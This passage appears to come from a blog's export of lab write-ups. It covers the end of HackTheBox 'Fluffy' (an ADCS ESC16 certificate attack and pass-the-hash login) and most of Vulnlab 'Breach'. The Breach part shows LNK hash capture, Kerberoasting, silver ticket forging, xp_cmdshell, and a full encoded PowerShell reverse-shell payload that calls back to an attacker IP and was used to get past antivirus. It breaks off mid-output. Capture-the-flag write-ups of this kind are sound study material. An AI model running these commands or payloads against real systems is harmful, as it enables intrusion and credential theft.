3670C4A715B864BB497F7CD72119B6F5 Certificate Validity Start : 2025-04-17 16:00:16+00:00 Certificate Validity End : 3024-04-17 16:11:16+00:00 Web Enrollment HTTP Enabled : False HTTPS Enabled : False User Specified SAN : Disabled Request Disposition : Issue Enforce Encryption for Requests : Enabled Active Policy : CertificateAuthority_MicrosoftDefault.Policy Disabled Extensions : 1.3.6.1.4.1.311.25.2 Permissions Owner : FLUFFY.HTB\\Administrators Access Rights ManageCa : FLUFFY.HTB\\Domain Admins FLUFFY.HTB\\Enterprise Admins FLUFFY.HTB\\Administrators ManageCertificates : FLUFFY.HTB\\Domain Admins FLUFFY.HTB\\Enterprise Admins FLUFFY.HTB\\Administrators Enroll : FLUFFY.HTB\\Cert Publishers [!] Vulnerabilities ESC16 : Security Extension is disabled. [*] Remarks ESC16 : Other prerequisites may be required for this to be exploitable. See the wiki for more details. Certificate Templates : [!] Could not find any certificate templates ESC(ID) is a way of identifying different vulnerabilities within ADCS. There is a great github page HERE that goes in depth into each ESC, how it works and how to exploit it.\nFirst, we read the UPN of ca_svc with our user p.agila (GenericWrite)\ncertipy-ad account -u \u0026#39;p.agila@fluffy.htb\u0026#39; -p \u0026#39;prometheusx-303\u0026#39; -dc-ip 10.10.11.69 -user \u0026#39;ca_svc\u0026#39; read Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Reading attributes for \u0026#39;ca_svc\u0026#39;: cn : certificate authority service distinguishedName : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb name : certificate authority service objectSid : S-1-5-21-497550768-2797716248-2627064577-1103 sAMAccountName : ca_svc servicePrincipalName : ADCS/ca.fluffy.htb userPrincipalName : ca_svc@fluffy.htb userAccountControl : 66048 whenCreated : 2025-04-17T16:07:50+00:00 whenChanged : 2025-09-17T17:43:15+00:00 Then change the UPN to administrator\ncertipy-ad account -u \u0026#39;p.agila@fluffy.htb\u0026#39; -p \u0026#39;prometheusx-303\u0026#39; -dc-ip 10.10.11.69 -upn \u0026#39;administrator\u0026#39; -user \u0026#39;ca_svc\u0026#39; update Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Updating user \u0026#39;ca_svc\u0026#39;: userPrincipalName : administrator [*] Successfully updated \u0026#39;ca_svc\u0026#39; From our Shadow Credential attack from before, export the ..cache file we got so we can use the ticket in the future\nexport KRB5CCNAME=/home/kali/htb/fluffy/ca_svc.ccache ┌──(kali㉿kali)-[~/htb/fluffy] └─$ klist Ticket cache: FILE:/home/kali/htb/fluffy/ca_svc.ccache Default principal: ca_svc@FLUFFY.HTB Valid starting Expires Service principal 09/17/2025 17:43:15 09/18/2025 03:43:15 krbtgt/FLUFFY.HTB@FLUFFY.HTB renew until 09/18/2025 17:42:08 faketime \u0026#39;2025-09-17 18:01:24\u0026#39; certipy-ad req -k -dc-ip 10.10.11.69 -target dc01.fluffy.htb -ca fluffy-DC01-CA -template \u0026#39;User\u0026#39; [!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail [*] Requesting certificate via RPC [*] Request ID is 15 [*] Successfully requested certificate [*] Got certificate with UPN \u0026#39;administrator\u0026#39; [*] Certificate has no object SID [*] Try using -sid to set the object SID or see the wiki for more details [*] Saving certificate and private key to \u0026#39;administrator.pfx\u0026#39; [*] Wrote certificate and private key to \u0026#39;administrator.pfx\u0026#39; Then we need to revert the UPN back to the original\ncertipy-ad account -u \u0026#39;p.agila@fluffy.htb\u0026#39; -p \u0026#39;prometheusx-303\u0026#39; -dc-ip 10.10.11.69 -upn \u0026#39;ca_svc@fluffy.htb\u0026#39; -user \u0026#39;ca_svc\u0026#39; update [*] Updating user \u0026#39;ca_svc\u0026#39;: userPrincipalName : ca_svc@fluffy.htb [*] Successfully updated \u0026#39;ca_svc\u0026#39; root.txt # faketime \u0026#39;2025-09-17 18:01:24\u0026#39; certipy-ad auth -dc-ip 10.10.11.69 -pfx administrator.pfx -username \u0026#39;administrator\u0026#39; -domain fluffy.htb Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Certificate identities: [*] SAN UPN: \u0026#39;administrator\u0026#39; [*] Using principal: \u0026#39;administrator@fluffy.htb\u0026#39; [*] Trying to get TGT... [*] Got TGT [*] Saving credential cache to \u0026#39;administrator.ccache\u0026#39; [*] Wrote credential cache to \u0026#39;administrator.ccache\u0026#39; [*] Trying to retrieve NT hash for \u0026#39;administrator\u0026#39; [*] Got hash for \u0026#39;administrator@fluffy.htb\u0026#39;: REDACTED evil-winrm -i 10.10.11.69 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e Evil-WinRM shell v3.7 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc\u0026#39; for module Reline Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; cd .. *Evil-WinRM* PS C:\\Users\\Administrator\u0026gt; cd desktop *Evil-WinRM* PS C:\\Users\\Administrator\\desktop\u0026gt; dir Directory: C:\\Users\\Administrator\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 9/16/2025 8:08 PM 34 root.txt New attack methods learned # ADCS ESC16 attack chain NTLM relay with malicious .zip file via CVE-2025-24071 Possible Remediations # Apply vendor patches for ADCS services and keep PKI components fully updated Restrict certificate template permissions and regularly audit ADCS configurations to prevent abuse ","date":"19 settembre 2025","externalUrl":null,"permalink":"/writeups/htb-fluffy/","section":"Writeups","summary":"\u003ch2 class=\"relative group\"\u003eOverview \n    \u003cdiv id=\"overview\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#overview\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003ePlatform\u003c/strong\u003e: HackTheBox\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDifficulty\u003c/strong\u003e: Easy\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eOS\u003c/strong\u003e: Windows\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eSkills\u003c/strong\u003e: Active Directory, privilege escalation\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cem\u003e\u003cstrong\u003eAssumed Breach Credentials: j.fleischman / J0elTHEM4n1990!\u003c/strong\u003e\u003c/em\u003e\u003c/p\u003e","title":"HackTheBox-Fluffy","type":"writeups"},{"content":"","date":"19 settembre 2025","externalUrl":null,"permalink":"/tags/mssql/","section":"Tags","summary":"","title":"Mssql","type":"tags"},{"content":"","date":"19 settembre 2025","externalUrl":null,"permalink":"/tags/potato/","section":"Tags","summary":"","title":"Potato","type":"tags"},{"content":" Overview # Platform: Vulnlab Difficulty: Medium OS: Windows Skills: Active Directory, privilege escalation, mssql Assumed Breach Credentials: No assumed breach\nReconnaissance # Nmap Scan # sudo nmap -sC -sV -p- -T4 $IP -vv 53/tcp open domain syn-ack ttl 127 Simple DNS Plus 80/tcp open http syn-ack ttl 127 Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: IIS Windows Server | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-09 18:17:27Z) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 127 464/tcp open kpasswd5? syn-ack ttl 127 593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 127 1433/tcp open ms-sql-s syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM | ms-sql-ntlm-info: | 10.10.72.195:1433: | Target_Name: BREACH | NetBIOS_Domain_Name: BREACH | NetBIOS_Computer_Name: BREACHDC | DNS_Domain_Name: breach.vl | DNS_Computer_Name: BREACHDC.breach.vl | DNS_Tree_Name: breach.vl |_ Product_Version: 10.0.20348 | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Issuer: commonName=SSL_Self_Signed_Fallback | | ms-sql-info: | 10.10.72.195:1433: | Version: | name: Microsoft SQL Server 2019 RTM | number: 15.00.2000.00 | Product: Microsoft SQL Server 2019 | Service pack level: RTM | Post-SP patches applied: false |_ TCP port: 1433 |_ssl-date: 2025-10-09T18:18:56+00:00; +1m58s from scanner time. 3269/tcp open tcpwrapped syn-ack ttl 127 3389/tcp open ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: BREACH | NetBIOS_Domain_Name: BREACH | NetBIOS_Computer_Name: BREACHDC | DNS_Domain_Name: breach.vl | DNS_Computer_Name: BREACHDC.breach.vl | DNS_Tree_Name: breach.vl | Product_Version: 10.0.20348 |_ System_Time: 2025-10-09T18:18:16+00:00 | ssl-cert: Subject: commonName=BREACHDC.breach.vl | Issuer: commonName=BREACHDC.breach.vl |_ssl-date: 2025-10-09T18:18:56+00:00; +1m59s from scanner time. 5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) Add breach.vl and breachdc.breach.vl to /etc/hosts\nFirst, we can check smb for null authentication, see if we can read or write to any shares.\ncrackmapexec smb 10.10.81.20 -u \u0026#39;f\u0026#39; -p \u0026#39;\u0026#39; --shares SMB 10.10.81.20 445 BREACHDC [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False) SMB 10.10.81.20 445 BREACHDC [+] breach.vl\\f: SMB 10.10.81.20 445 BREACHDC [+] Enumerated shares SMB 10.10.81.20 445 BREACHDC Share Permissions Remark SMB 10.10.81.20 445 BREACHDC ----- ----------- ------ SMB 10.10.81.20 445 BREACHDC ADMIN$ Remote Admin SMB 10.10.81.20 445 BREACHDC C$ Default share SMB 10.10.81.20 445 BREACHDC IPC$ READ Remote IPC SMB 10.10.81.20 445 BREACHDC NETLOGON Logon server share SMB 10.10.81.20 445 BREACHDC share READ,WRITE SMB 10.10.81.20 445 BREACHDC SYSVOL Logon server share SMB 10.10.81.20 445 BREACHDC Users READ Seems we can null authenticate, read some shares and even write to one of them. Since we dont have breached credentials to access any of the services running on the box, or run bloodhound - our foothold could be through this writeable share.\nWhenever i see i can write to a share, i first try the netexec slinky module, which puts .lnk files redirecting to our local share location in order to grab hashes. We can then catch these hashes with responder.\nnxc smb breach.vl -u test -p \u0026#39;\u0026#39; -M slinky -o name=beejay server=10.8.7.149 SMB 10.10.81.20 445 BREACHDC [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:None) (Null Auth:True) SMB 10.10.81.20 445 BREACHDC [+] breach.vl\\test: (Guest) SMB 10.10.81.20 445 BREACHDC [*] Enumerated shares SMB 10.10.81.20 445 BREACHDC Share Permissions Remark SMB 10.10.81.20 445 BREACHDC ----- ----------- ------ SMB 10.10.81.20 445 BREACHDC ADMIN$ Remote Admin SMB 10.10.81.20 445 BREACHDC C$ Default share SMB 10.10.81.20 445 BREACHDC IPC$ READ Remote IPC SMB 10.10.81.20 445 BREACHDC NETLOGON Logon server share SMB 10.10.81.20 445 BREACHDC share READ,WRITE SMB 10.10.81.20 445 BREACHDC SYSVOL Logon server share SMB 10.10.81.20 445 BREACHDC Users READ SLINKY 10.10.81.20 445 BREACHDC [+] Found writable share: share SLINKY 10.10.81.20 445 BREACHDC [+] Created LNK file on the share share Note that after starting Responder, you wont get an initial callback even waiting for some time, this is because the slinky module puts the .lnk file in the share root location, but if there are more directories in that share, it wont detect them.\nTherefore, go into \u0026ldquo;share\u0026rdquo; and get that .lnk file, move do the other directories in the share and put it in them manually, then start responder.\nsudo responder -I tun0 -v __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| [+] Poisoners: LLMNR [ON] NBT-NS [ON] MDNS [ON] DNS [ON] DHCP [OFF] [+] Servers: HTTP server [ON] HTTPS server [ON] WPAD proxy [OFF] Auth proxy [OFF] SMB server [ON] Kerberos server [ON] SQL server [ON] FTP server [ON] IMAP server [ON] POP3 server [ON] SMTP server [ON] DNS server [ON] LDAP server [ON] MQTT server [ON] RDP server [ON] DCE-RPC server [ON] WinRM server [ON] SNMP server [ON] [+] HTTP Options: Always serving EXE [OFF] Serving EXE [OFF] Serving HTML [OFF] Upstream Proxy [OFF] [+] Poisoning Options: Analyze Mode [OFF] Force WPAD auth [OFF] Force Basic Auth [OFF] Force LM downgrade [OFF] Force ESS downgrade [OFF] [+] Generic Options: Responder NIC [tun0] Responder IP [10.8.7.149] Responder IPv6 [fe80::ff8b:1180:777f:3c81] Challenge set [random] Don\u0026#39;t Respond To Names [\u0026#39;ISATAP\u0026#39;, \u0026#39;ISATAP.LOCAL\u0026#39;] Don\u0026#39;t Respond To MDNS TLD [\u0026#39;_DOSVC\u0026#39;] TTL for poisoned response [default] [+] Current Session Variables: Responder Machine Name [WIN-CF23CVPX6EP] Responder Domain Name [JASG.LOCAL] Responder DCE-RPC Port [47264] [*] Version: Responder 3.1.7.0 [*] Author: Laurent Gaffie, \u0026lt;lgaffie@secorizon.com\u0026gt; [*] To sponsor Responder: https://paypal.me/PythonResponder [+] Listening for events... [!] Error starting TCP server on port 389, check permissions or other servers running. [SMB] NTLMv2-SSP Client : 10.10.81.20 [SMB] NTLMv2-SSP Username : BREACH\\Julia.Wong [SMB] NTLMv2-SSP Hash : Julia.Wong::BREACH:944eb9e9f43e1dd2:D49DE050C3F4525E8B379E57E5064EA7:01010000000000000039C8CBB639DC019B2CD8CA95C052A900000000020008004A0041005300470001001E00570049004E002D004300460032003300430056005000580036004500500004003400570049004E002D00430046003200330043005600500058003600450050002E004A004100530047002E004C004F00430041004C00030014004A004100530047002E004C004F00430041004C00050014004A004100530047002E004C004F00430041004C00070008000039C8CBB639DC01060004000200000008003000300000000000000001000000002000007698A398C70DDDE7F165AED6A20492E8F09329AE304EEF9DD622AEE223575F3F0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E0038002E0037002E003100340039000000000000000000 We got a hash for the user julia.wong, we used john to crack it\nNow lets enumerate our user:\nsmbclient -U \u0026#39;julia.wong\u0026#39; //breach.vl/share Password for [WORKGROUP\\julia.wong]: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Fri Oct 10 07:27:41 2025 .. DHS 0 Thu Feb 17 15:38:00 2022 beejay.lnk A 946 Fri Oct 10 07:26:22 2025 finance D 0 Thu Feb 17 11:19:34 2022 software D 0 Thu Feb 17 11:19:12 2022 transfer D 0 Fri Oct 10 07:26:57 2025 7863807 blocks of size 4096. 2618345 blocks available smb: \\\u0026gt; cd transfer\\ smb: \\transfer\\\u0026gt; ls . D 0 Fri Oct 10 07:26:57 2025 .. D 0 Fri Oct 10 07:27:41 2025 beejay.lnk A 946 Fri Oct 10 07:26:57 2025 claire.pope D 0 Thu Feb 17 11:21:35 2022 diana.pope D 0 Thu Feb 17 11:21:19 2022 julia.wong D 0 Thu Feb 17 11:24:39 2022 7863807 blocks of size 4096. 2617763 blocks available smb: \\transfer\\\u0026gt; cd julia.wong\\ smb: \\transfer\\julia.wong\\\u0026gt; ls . D 0 Thu Feb 17 11:24:39 2022 .. D 0 Fri Oct 10 07:26:57 2025 local.txt A 36 Thu Feb 17 11:25:02 2022 7863807 blocks of size 4096. 2614416 blocks available You\u0026rsquo;ll find this user has access to the same shares as before, but we can use her credentials to access her personal directory in the user share, gaining the user flag\nlets see if we can access mssql:\nimpacket-mssqlclient julia.wong:\u0026#39;Computer1\u0026#39;@10.10.81.20 -windows-auth Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(BREACHDC\\SQLEXPRESS): Line 1: Changed database context to \u0026#39;master\u0026#39;. [*] INFO(BREACHDC\\SQLEXPRESS): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (150 7208) [!] Press help for extra shell commands SQL (BREACH\\Julia.Wong guest@master)\u0026gt; SELECT name FROM master..sysdatabases; name ------ master tempdb model msdb SQL (BREACH\\Julia.Wong guest@master)\u0026gt; enable_xp_cmdshell ERROR(BREACHDC\\SQLEXPRESS): Line 105: User does not have permission to perform this action. SQL (BREACH\\Julia.Wong guest@master)\u0026gt; enum_logins name type_desc is_disabled sysadmin securityadmin serveradmin setupadmin processadmin diskadmin dbcreator bulkadmin ------------- ------------- ----------- -------- ------------- ----------- ---------- ------------ --------- --------- --------- sa SQL_LOGIN 1 1 0 0 0 0 0 0 0 BUILTIN\\Users WINDOWS_GROUP 0 0 0 0 0 0 0 0 0 SQL (BREACH\\Julia.Wong guest@master)\u0026gt; enum_impersonate execute as database permission_name state_desc grantee grantor ---------- -------- --------------- ---------- ------- ------- Nothing useful for us since we cant enable xp_cmdshell and nothing useful in the file system when enumerating xp_dirtree..\nLets run bloodhound and see if our user can do anything special:\nour user doesnt have any outbound permissions, but there is a kerberoastable user - svc_mssql - perhaps we can kerberoast this user and then use it to elevate our privileges within mssql, lets try.\nimpacket-GetUserSPNs -outputfile kerberoastables.txt -dc-ip 10.10.81.20 \u0026#39;breach.vl/julia.wong:Computer1\u0026#39; $krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl/svc_mssql*$373a843a60378b2d5b0a7915d6c4d90e$8fa569e98bd9e10ee16988c20176da774f8d8e0b20740bb279d41b073978644355894dc2e78dfcf5de3a25c19c129866657fdf5db54440ce1129fec7bfb2e6076420b702bdbd9dc07c1f9623c39291016d50bc4a6892e6bd365507d53a7c2aff4d7bb0c6436bb8fa5a8646354b5aed16d18dbc72637f0938d5e23ea05ce6e33f3df2beaca41f4081fa794b6bd2f94a22c8f081a51a00c6f5fa9c7a0bf6fa58583b17c0ee32b36cff246c35269399ddbee5777ab8ed042b421a1e56d627f69a464bfb835dc810ae6fa97d9886b856d217800fde774e1c2b8cc42c94e8520394dc6ff1a5f3fa17f9ea986b16759f776a2fb7ba7c10c6be200c1518ff77240d1f311765f2937143b988e7ddd410731f33e323233fbafefe0ac98078db3878cdeea18014827757932f44b0a08715eb4fbcbcb40f70105b05a531b13265fd52fed95d37a5e38591545e0f48d047e2f7e14101b9c1885965971871b96cda5c134ca02171f6c9df76869bc2fb94409043ade4a06a7074e35ea7bb0816ee83fbc318cbb2b7f58d1963d6c9092ec2a6370be1dda3b53b3f5aa2ad45346bf12e1fe41d74907a7523db03a282f718d24ccb74ea1d7aa975fb14c42f5a1a89ca5eceb0d4d6e5f601e785957ef3d322f6b031a3db8510f1c1858621750aeae677606a479e93113ed04fa5902344f5898e3ff72efadf4869ebff040d9a237c0908817eccbd5a7f3811df9e5705f59cacb43999150f790e3cc5bfbf3f6f41c1604ad75f9e026f2749614e9a090acd36e602d379b0109d12d1edd2cc395b6f6aa5fc0ae6453455a13351df33c0e53e55d0d578f4c52dddb09aad7d242b7eeebeeedd4b1dfc38b7bf5e78c5960bd9bc0eef72cbab88daac51ffd6f7809012072214ad7984c945b5c9d43ea06375adb4cebf11661884108928036cdeb668118465733336e7e9fd8463c3acf316ae74a02d01301102d88efdba4c9a0ea75ab6fd8a4c6d7ebff416fd5097019bb43ca316e08799305e4087a5b8b51d9f7db43e43ba2463758a7fff22c217a32a231f20946d127ac3a8d4b4860b2120f04c9d9e66b1dc914c336ae8d00883a30b3478d28a2b945df5cad20865b2cab42659b38bfcbf792c4122b954e6679bddb8785a72ce6559b5cdde82b7bddbf475a91ccb70372422ab32b6215a635c456592115f860fce350dd4b7bdee7a247898953b3d2212d222f836ee3ce3c75441960186d93ae976792a5bc3a7fa2a005b31aad3a95c050a6d0749e78d54e373e2d4e2760641b536b63fee61d30cae8a3cb33d451d073b585a698bca4d64e984c6c6a6479c02c5192a7521b4322efd71dca4ce9fc6ea29eaaa9c5b96e6f215a6f32ef4f34339c6e028de786a8e3003ae0b78883f6be753c5aad027b138c24867c2be3c40ea3e3e2c4ac6dd1c90d195145ea39c316b2c753554d9dcb4900f1e5612e57aa0cdaab1a5b3aefd345c81d0246c6d190f *crack* john hash1.txt --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4]) Will run 6 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status Trustno1 (?) 1g 0:00:00:00 DONE (2025-10-10 07:46) 10.00g/s 522240p/s 522240c/s 522240C/s patitos..lili12 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. now we own the user svc_mssql, lets see if we have xp_cmdshell access within mssql:\nSQL (BREACH\\svc_mssql guest@master)\u0026gt; enable_xp_cmdshell ERROR(BREACHDC\\SQLEXPRESS): Line 105: User does not have permission to perform this action. ERROR(BREACHDC\\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement. ERROR(BREACHDC\\SQLEXPRESS): Line 62: The configuration option \u0026#39;xp_cmdshell\u0026#39; does not exist, or it may be an advanced option. ERROR(BREACHDC\\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement. Hmm, okay. we can try something i have recently learned: a silver ticket attack.\nA Silver Ticket Attack is a Kerberos-based attack where an attacker forges a service ticket (TGS) instead of the TGT (Ticket Granting Ticket). This allows unauthorized access to a specific service without needing to communicate with the Domain Controller (KDC). Since Silver Tickets are generated offline and don’t require KDC validation, they can be harder to detect compared to Golden Ticket Attacks. After forging the Silver Ticket, we pass it to the target service, which gives us elevated access. From there, we’ll execute MSSQL commands with higher permissions — and finally, drop a reverse shell.\nFor this we will need to get the NTLM hash of our user, since we have the password already, this step is easy:\niconv -f ASCII -t UTF-16LE \u0026lt;(printf \u0026#34;Trustno1\u0026#34;) | openssl dgst -md4 MD4(stdin)= 69596c7aa1e8daee17f8e78870e25a5c Then, get the ticket: (the spn i used was the one set for the user itself, can check in bloodhound)\nimpacket-ticketer -nthash \u0026#39;69596c7aa1e8daee17f8e78870e25a5c\u0026#39; -domain-sid \u0026#39;S-1-5-21-2330692793-3312915120-706255856\u0026#39; -domain \u0026#39;breach.vl\u0026#39; -spn \u0026#39;MSSQLSvc/breachdc.breach.vl:1433\u0026#39; \u0026#39;svc_mssql\u0026#39; Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] Creating basic skeleton ticket and PAC Infos [*] Customizing ticket for breach.vl/svc_mssql [*] PAC_LOGON_INFO [*] PAC_CLIENT_INFO_TYPE [*] EncTicketPart [*] EncTGSRepPart [*] Signing/Encrypting final ticket [*] PAC_SERVER_CHECKSUM [*] PAC_PRIVSVR_CHECKSUM [*] EncTicketPart [*] EncTGSRepPart [*] Saving ticket in svc_mssql.ccache export KRB5CCNAME=svc_mssql.ccache ┌──(kali㉿kali)-[~/vulnlab/machines/breach] └─$ klist Ticket cache: FILE:svc_mssql.ccache Default principal: svc_mssql@BREACH.VL Valid starting Expires Service principal 10/10/2025 08:47:34 10/08/2035 08:47:34 MSSQLSvc/breachdc.breach.vl:1433@BREACH.VL renew until 10/08/2035 08:47:34 Now lets use the ticket to access mssql, and it should be elevated\nimpacket-mssqlclient -no-pass -k breach.vl/svc_mssql@breachdc.breach.vl Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(BREACHDC\\SQLEXPRESS): Line 1: Changed database context to \u0026#39;master\u0026#39;. [*] INFO(BREACHDC\\SQLEXPRESS): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (150 7208) [!] Press help for extra shell commands SQL (BREACH\\Administrator dbo@master)\u0026gt; enable_xp_cmdshell INFO(BREACHDC\\SQLEXPRESS): Line 185: Configuration option \u0026#39;show advanced options\u0026#39; changed from 0 to 1. Run the RECONFIGURE statement to install. INFO(BREACHDC\\SQLEXPRESS): Line 185: Configuration option \u0026#39;xp_cmdshell\u0026#39; changed from 0 to 1. Run the RECONFIGURE statement to install. SQL (BREACH\\Administrator dbo@master)\u0026gt; xp_cmdshell whoami output ---------------- breach\\svc_mssql Okay for the most annoying part of this box, bypassing the obnoxious AV that was present on it\u0026hellip;\nI tried many payloads with xp_cmdshell, the only one or the first one that worked for me was using Hoaxshell to get a shell.\nhoaxshell -s 10.8.7.149 -p 4444 -H \u0026#34;Authorization\u0026#34; ┬ ┬ ┌─┐ ┌─┐ ─┐ ┬ ┌─┐ ┬ ┬ ┌─┐ ┬ ┬ ├─┤ │ │ ├─┤ ┌┴┬┘ └─┐ ├─┤ ├┤ │ │ ┴ ┴ └─┘ ┴ ┴ ┴ └─ └─┘ ┴ ┴ └─┘ ┴─┘ ┴─┘ by t3l3machus [Info] Generating reverse shell payload... powershell -e JABzAD0AJwAxADAALgA4AC4ANwAuADEANAA5ADoANAA0ADQANAAnADsAJABpAD0AJwA5ADEAMQBjADkANwBhADgALQAwADYANgAyADIAOQAxADgALQAwADcANAAzAGEAOAAxADkAJwA7ACQAcAA9ACcAaAB0AHQAcAA6AC8ALwAnADsAJAB2AD0ASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8AOQAxADEAYwA5ADcAYQA4ACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAiAD0AJABpAH0AOwB3AGgAaQBsAGUAIAAoACQAdAByAHUAZQApAHsAJABjAD0AKABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBVAHIAaQAgACQAcAAkAHMALwAwADYANgAyADIAOQAxADgAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBBAHUAdABoAG8AcgBpAHoAYQB0AGkAbwBuACIAPQAkAGkAfQApAC4AQwBvAG4AdABlAG4AdAA7AGkAZgAgACgAJABjACAALQBuAGUAIAAnAE4AbwBuAGUAJwApACAAewAkAHIAPQBpAGUAeAAgACQAYwAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwB0AG8AcAAgAC0ARQByAHIAbwByAFYAYQByAGkAYQBiAGwAZQAgAGUAOwAkAHIAPQBPAHUAdAAtAFMAdAByAGkAbgBnACAALQBJAG4AcAB1AHQATwBiAGoAZQBjAHQAIAAkAHIAOwAkAHQAPQBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJABwACQAcwAvADAANwA0ADMAYQA4ADEAOQAgAC0ATQBlAHQAaABvAGQAIABQAE8AUwBUACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAiAD0AJABpAH0AIAAtAEIAbwBkAHkAIAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAkAGUAKwAkAHIAKQAgAC0AagBvAGkAbgAgACcAIAAnACkAfQAgAHMAbABlAGUAcAAgADAALgA4AH0A Copied to clipboard! [Info] Type \u0026#34;help\u0026#34; to get a list of the available prompt commands. [Info] Http Server started on port 4444. [Important] Awaiting payload execution to initiate shell session... [Shell] Payload execution verified! [Shell] Stabilizing command prompt... PS C:\\Windows\\system32 \u0026gt; cd / PS C:\\ \u0026gt; cd users PS C:\\users \u0026gt; cd svc_mssql PS C:\\users\\svc_mssql \u0026gt; cd desktop PS C:\\users\\svc_mssql\\desktop \u0026gt; whoami /all USER INFORMATION ---------------- User Name SID ================ ============================================= breach\\svc_mssql S-1-5-21-2330692793-3312915120-706255856-1115 GROUP INFORMATION ----------------- Group Name Type SID Attributes ========================================== ================ =============================================================== ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\SERVICE Well-known group S-1-5-6 Mandatory group, Enabled by default, Enabled group CONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group NT SERVICE\\MSSQL$SQLEXPRESS Well-known group S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133 